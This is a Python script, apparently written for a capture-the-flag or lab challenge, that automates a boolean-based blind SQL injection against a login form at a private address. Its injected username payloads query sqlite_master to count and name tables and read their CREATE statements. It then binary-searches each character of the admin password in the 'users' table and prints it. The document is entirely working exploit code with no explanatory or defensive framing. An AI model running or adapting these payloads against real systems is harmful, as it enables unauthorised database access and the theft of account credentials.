import requests

DEST = "http://10.67.188.178:5000/challenge3/login"


def createPostRequest(dest, params):

    response = requests.post(dest, data=params, allow_redirects=False)

    if response.status_code == 302:
        return True
    elif response.status_code == 200:
        return False
    
    else:
        print("Received unexpected status code " + str(response.status_code))
        raise ValueError
    



def getNumberOfTables():

    for i in range(1, 10):

        is_match = createPostRequest(DEST, {"username":f"' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table') = {i}--", "password":"letmein"})

        if is_match:
            return i
    
    print("There are more than 10 tables.")
    return None




def getLengthOfTableName(tableIndex):

    for i in range(1,20):

        is_match = createPostRequest(DEST, {"username":f"' OR (SELECT LENGTH(name) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {tableIndex-1}) = {i}--", "password":"letmein"})

        if is_match:
            return i
    
    print("It is longer than 20 characters.")
    return None




def getLengthOfCreateCommand(table_name):

    for i in range(1,200):

        is_match = createPostRequest(DEST, {"username":f"' OR (SELECT LENGTH(sql) FROM sqlite_master WHERE name='{table_name}') = {i}--", "password":"letmein"})

        if is_match:
            return i
    
    print("It is longer than 200 characters.")
    return None





def findTableNames():

    names = []
    number_of_tables = getNumberOfTables()

    # For each table in the database, find the length of the name.
    # Then binary search each character to construct the name, and add it to names.
    for table_index in range(1, number_of_tables + 1):

        table_name_length = getLengthOfTableName(table_index)

        name = ""

        for char_index in range(1, table_name_length+1):
            name += findTableNameCharacter(table_index, char_index)
        
        names.append(name)

    return names



def findTableNameCharacter(tableIndex, position):

    min = 0
    max = 127

    while True:

        midpoint = (min + max) // 2


        greater_than = createPostRequest(DEST, {"username":f"' OR (SELECT SUBSTR(name,{position},1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {tableIndex-1}) > CHAR({midpoint})--", "password":"letmein"})

        # If the targeted character is GREATER THAN our midpoint, move the minimum up.
        if greater_than:

            min = midpoint + 1


        else:
            
            # Else if the targeted character is LESS THAN our midpoint, move the minimum down.
            less_than = createPostRequest(DEST, {"username":f"' OR (SELECT SUBSTR(name,{position},1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {tableIndex-1}) < CHAR({midpoint})--","password":"letmein"})

            if less_than:

                max = midpoint

            # If it is neither greater than nor less than, we found the character.
            else:

                return chr(midpoint)
            




def findCreateCommand(table_name):

    prev_char = 0

    command = ""
    for i in range(1, 200):

        prev_char = findCreateCommandCharacter(table_name, i)

        # End upon finding ), indicating end of statement.
        if prev_char == ")":
            break

        command += prev_char
    
    return command


def findCreateCommandCharacter(table_name, position):

    min = 0
    max = 127

    while True:

        midpoint = (min + max) // 2


        greater_than = createPostRequest(DEST, {"username":f"' OR (SELECT SUBSTR(sql,{position},1) FROM sqlite_master WHERE name='{table_name}') > CHAR({midpoint})--", "password":"letmein"})

        

        # If the targeted character is GREATER THAN our midpoint, move the minimum up.
        if greater_than:

            min = midpoint + 1


        else:
            
            # Else if the targeted character is LESS THAN our midpoint, move the minimum down.
            less_than = createPostRequest(DEST, {"username":f"' OR (SELECT SUBSTR(sql,{position},1) FROM sqlite_master WHERE name='{table_name}') < CHAR({midpoint})--", "password":"letmein"})
            

            if less_than:

                max = midpoint

            # If it is neither greater than nor less than, we found the character.
            else:

                return chr(midpoint)
            



def findPassword(table_name):
    
    prev_char = ""
    password = ""

    # Effective password limit of 100 characters
    for i in range(1,100):
        prev_char = findPasswordCharacter(table_name, i)

        if prev_char == None:
            break
        
        password += prev_char
        print(password)
    
    return password


def findPasswordCharacter(table_name, position):

    min = 0
    max = 127

    passes = 0

    while True:

        # If reach 8th pass without returning anything, must be end of string.
        passes += 1
        if passes == 8:
            return None
        
        midpoint = (min + max) // 2


        greater_than = createPostRequest(DEST, {"username":f"' OR (SELECT SUBSTR(password,{position},1) FROM {table_name} WHERE username='admin') > CHAR({midpoint})--", "password":"letmein"})


        # If the targeted character is GREATER THAN our midpoint, move the minimum up.
        if greater_than:

            min = midpoint + 1


        else:
            
            # Else if the targeted character is LESS THAN our midpoint, move the minimum down.
            less_than = createPostRequest(DEST, {"username":f"' OR (SELECT SUBSTR(password,{position},1) FROM {table_name} WHERE username='admin') < CHAR({midpoint})--", "password":"letmein"})
            

            if less_than:

                max = midpoint

            # If it is neither greater than nor less than, we found the character.
            else:

                return chr(midpoint)



print( findPassword("users") )